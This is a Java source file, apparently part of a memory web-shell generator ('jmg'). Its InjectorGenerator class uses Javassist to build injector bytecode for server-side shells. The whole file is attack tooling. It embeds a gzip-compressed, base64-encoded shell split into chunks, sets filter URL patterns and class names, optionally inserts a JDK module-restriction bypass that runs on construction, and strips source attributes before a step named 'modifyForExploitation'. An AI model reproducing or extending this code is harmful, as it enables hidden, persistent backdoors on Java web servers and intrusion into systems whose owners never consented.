package jmg.core.generator;

import javassist.*;
import javassist.bytecode.AccessFlag;
import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;
import jmg.core.util.*;


/**
 * 注入器生成
 */
public class InjectorGenerator {
    public byte[] makeInjector(AbstractConfig config) throws Exception {
        String injectorName = InjectorUtil.getInjectorName(config.getServerType(), config.getShellType());
        String injectorClassName = InjectorUtil.getInjectorClassName(injectorName);
        byte[] bytes = UtilPlus.generate(injectorClassName, config);
        config.setInjectorBytes(bytes);
        config.setInjectorBytesLength(bytes.length);
        return bytes;
    }


    public static class UtilPlus {
        @SuppressWarnings("unchecked")
        private final static ClassPool pool = ClassPool.getDefault();

        public static byte[] generate(String injectorTplClassName, AbstractConfig config) throws Exception {
            pool.insertClassPath(new ClassClassPath(InjectorGenerator.class));
            CtClass ctClass = pool.getCtClass(injectorTplClassName);
            ctClass.getClassFile().setVersionToJava5();
            String base64ShellString = CommonUtil.encodeBase64(CommonUtil.gzipCompress(config.getShellBytes())).replace(System.lineSeparator(), "");

            String urlPattern = config.getUrlPattern();
            String shellClassName = config.getShellClassName();

            if (base64ShellString != null) {
                CtMethod getBase64String = ctClass.getDeclaredMethod("getBase64String");
                String[] parts = splitChunks(base64ShellString.replace(System.lineSeparator(), ""), 40000);
                StringBuilder result = new StringBuilder();
                for (int i = 0; i < parts.length; i++) {
                    if (i > 0)
                        result.append("+");
                    result.append("new String(\"" + parts[i] + "\")");
                }

                getBase64String.setBody(String.format("{return %s;}", result));
            }

            if (config.getShellType().equalsIgnoreCase(Constants.SHELL_FILTER) || config.getShellType().equalsIgnoreCase(Constants.SHELL_WF_HANDLERMETHOD)) {
                CtMethod getUrlPattern = ctClass.getDeclaredMethod("getUrlPattern");
                getUrlPattern.setBody(String.format("{return \"%s\";}", urlPattern));
            }

            if (shellClassName != null) {
                CtMethod getUrlPattern = ctClass.getDeclaredMethod("getClassName");
                getUrlPattern.setBody(String.format("{return \"%s\";}", shellClassName));
            }

            if (config.isEnableBypassJDKModule()) {
                // 添加 bypassJDKModule 方法
                CtMethod ctMethod = new CtMethod(CtClass.voidType, "bypassJDKModule", new CtClass[0], ctClass);
                ctMethod.setModifiers(AccessFlag.PUBLIC);
                ctMethod.setBody(JDKBypassUtil.bypassJDKModuleBody());
                ctClass.addMethod(ctMethod);

                // 添加 bypassJDKModule 调用
                CtConstructor constructor = ctClass.getConstructors()[0];
                constructor.setModifiers(javassist.Modifier.setPublic(constructor.getModifiers()));
                constructor.insertBeforeBody("bypassJDKModule();");
            }

            JavassistUtil.setNameIfNotNull(ctClass, config.getInjectorClassName());
            JavassistUtil.removeSourceFileAttribute(ctClass);
            byte[] bytes = new CtClassUtil(config, pool, ctClass).modifyForExploitation();
            ctClass.detach();
            return bytes;
        }

        private static String[] splitChunks(String source, int CHUNK_SIZE) {
            String[] ret = new String[(int) Math.ceil(source.length() / (double) CHUNK_SIZE)];
            char[] payload = source.toCharArray();
            int start = 0;
            for (int i = 0; i < ret.length; i++) {
                if (start + CHUNK_SIZE > payload.length) {
                    char[] b = new char[payload.length - start];
                    System.arraycopy(payload, start, b, 0, payload.length - start);
                    ret[i] = new String(b);
                } else {
                    char[] b = new char[CHUNK_SIZE];
                    System.arraycopy(payload, start, b, 0, CHUNK_SIZE);
                    ret[i] = new String(b);
                }
                start += CHUNK_SIZE;
            }
            return ret;
        }
    }


}


